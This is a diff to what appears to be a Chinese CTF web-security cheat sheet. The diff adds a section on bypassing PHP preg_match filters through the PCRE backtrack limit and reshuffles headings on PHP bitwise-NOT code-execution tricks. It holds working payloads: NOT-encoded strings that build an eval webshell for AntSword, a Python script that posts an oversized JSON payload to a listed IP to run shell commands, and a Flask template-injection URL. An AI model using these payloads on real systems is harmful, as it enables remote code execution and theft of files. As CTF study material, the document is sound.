@@ -956,7 +956,9 @@ http://xxx/?p=uniq${IFS}f???.php
 
 > 如 preg_match("/[A-Za-z0-9]+/",$code)
 
-##### 取反通用方法
+##### 取反
+
+###### 取反通用方法
 
 如需执行 `eval($code);`
 
@@ -998,7 +1000,7 @@ echo "~" . urlencode(~$a) . "\n";
 
 PS：不用深究上面的字符串为什么会被正确执行，这是 PHP 解释器的运作机制，学会该用法即可。
 
-##### 取反执行某个函数
+###### 取反执行某个函数
 
 取反后 得到不可读的打印串，再将 url 编码
 ```php
@@ -1016,7 +1018,7 @@ echo $d;
 (~%8F%97%8F%96%91%99%90)();
 ```
 
-##### 取反连接蚁剑
+###### 取反连接蚁剑
 
 > 通过构建 assert（eval(_POST[1])）来使蚁剑连接
 
@@ -1036,6 +1038,66 @@ echo '(~'.$d.')';
 ```
 http://xxx/code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);
 ```
+
+##### PCRE 回溯 (绕过 preg_match 匹配上限)
+
+- 当发现什么都被正则过滤了（连取反字符也被过滤了），可以考虑这种方法
+- 条件：题目需要是 POST 传参 或 `$_REQUEST['letter']` 这种传参 (GET 方法有参数量限制，所以不行？)
+
+原理文章: https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html (简单说就是他匹配有一个上限，超出这个上限就可以绕过 preg_match 了,然后正常 preg_match 的上限就是 1000000，我们绕过了 preg_match 函数的匹配上限)
+
+例题: https://www.ctfer.vip/problem/1897
+
+例题代码：
+
+```php
+<?php
+include "check.php";
+if (isset($_REQUEST['letter'])){
+    $txw4ever = $_REQUEST['letter'];
+    if (preg_match('/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m',$txw4ever)){
+        die("再加把油喔");
+    }
+    else{
+        $command = json_decode($txw4ever,true)['cmd'];
+        checkdata($command);
+        @eval($command);
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+答案：
+
+```python
+import requests
+ 
+url = "http://1.14.71.254:28052/"
+# 这里必须使用特殊字符,@$之类没有被原题过滤的符号都是可以的
+# 这里的 data 只是为了构造 json，因为例题中需要 json 格式
+# "?><?=`nl /f*`;?>" 是内联执行
+# 此处用 nl 的原因是原题中 checkdata() 过滤了 cat、tac (checkdata 是另一个函数，不是此处 "@"*1000000 绕过的正则表达式)
+data='{"cmd":"?><?=`nl /f*`;?>","t":"' + "@"*1000000 + '"}' 
+a = requests.post(url=url,data={'letter': data}).text
+print(a)
+```
+
+原题中 PHP 代码接收一个 HTTP 请求参数 'letter'，将其解析为 JSON，然后提取出 'cmd' 字段的值，最后使用 PHP 的 `eval` 函数执行这个值作为 PHP 代码。
+
+在正常的安全检查中，有一个正则表达式用于阻止用户提交某些特殊字符，这些特殊字符通常在命令注入或代码注入攻击中使用。但是，这个正则表达式有一个问题，它并没有阻止所有的特殊字符，比如 '@' 和 '$'。
+
+Python的攻击代码利用了这个缺陷。它首先构造了一个 JSON 对象，其中 'cmd' 字段的值是一个 PHP 代码字符串 "?><?=`nl /f*`;?>"，这段代码会列出服务器上所有以 'f' 开头的文件的内容。然后，这个 JSON 对象被转换为一个字符串，其中包含一个大量 '@' 字符的 't' 字段。这个 't' 字段是为了绕过正则表达式的安全检查，因为 '@' 字符没有被正则表达式禁止。（简单说就是他匹配有一个上限，超出这个上限就可以绕过preg_match了,然后正常preg_match的上限就是1000000）
+
+然后，这个字符串被发送到服务器，服务器的 PHP 代码将其解析为一个 JSON 对象，提取出 'cmd' 字段的值，然后执行这个值作为 PHP 代码。
+
+```php
+"?><?=`nl /f*`;?>"
+```
+
+是内联执行。在这里，它们被用来结束当前的 PHP 代码块并立即开始一个新的 PHP 代码块。这是因为在 eval 函数中执行的代码将被插入到当前的 PHP 代码块中，如果不使用这些标签，那么插入的代码可能会与当前的 PHP 代码混淆，导致语法错误。
 
 #### 执行系统命令
 
@@ -1903,7 +1965,7 @@ mt_srand(372619038) 设置了 mt_rand() 的种子为 372619038，这意味着接
 http://xxx/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
 ```
 
-#### 执行系统命令
+##### 执行系统命令
 
 建议根据下面一点一点试（下面的示例层层递进？）
 
